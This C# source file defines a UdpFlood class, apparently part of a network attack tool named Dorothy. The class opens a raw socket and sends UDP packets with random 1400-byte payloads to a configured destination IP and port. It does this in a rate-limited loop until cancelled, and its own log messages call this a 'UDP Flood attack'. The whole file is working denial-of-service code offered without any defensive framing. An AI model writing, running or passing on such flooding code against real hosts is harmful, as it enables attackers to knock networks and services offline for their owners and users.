using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;

namespace Dorothy.Models
{
    public class UdpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private Socket? _socket;

        public UdpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting UDP Flood attack.");

            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Udp);
                _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, false);

                byte[] udpHeader = new byte[8];  // UDP header size
                byte[] payload = new byte[1400]; // Payload size

                var random = new Random();
                int packetSize = udpHeader.Length + payload.Length;
                int packetsPerSecond = (int)Math.Ceiling(_params.BytesPerSecond / (double)packetSize);

                await Task.Run(() =>
                {
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            // Create UDP header
                            BitConverter.GetBytes((ushort)_params.SourcePort).CopyTo(udpHeader, 0);
                            BitConverter.GetBytes((ushort)_params.DestinationPort).CopyTo(udpHeader, 2);
                            BitConverter.GetBytes((ushort)(8 + payload.Length)).CopyTo(udpHeader, 4); // Length
                            BitConverter.GetBytes((ushort)0).CopyTo(udpHeader, 6); // Checksum

                            // Generate random payload
                            random.NextBytes(payload);

                            // Combine header and payload
                            byte[] fullPacket = new byte[udpHeader.Length + payload.Length];
                            Buffer.BlockCopy(udpHeader, 0, fullPacket, 0, udpHeader.Length);
                            Buffer.BlockCopy(payload, 0, fullPacket, udpHeader.Length, payload.Length);

                            var endpoint = new IPEndPoint(_params.DestinationIp, 0);
                            _socket.SendTo(fullPacket, endpoint);

                            if (packetsPerSecond > 0)
                                Thread.Sleep(1000 / packetsPerSecond);
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending UDP packet (Layer 3).");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "UDP Flood attack failed.");
                throw;
            }
        }

        public void Dispose()
        {
            _socket?.Dispose();
        }
    }
} 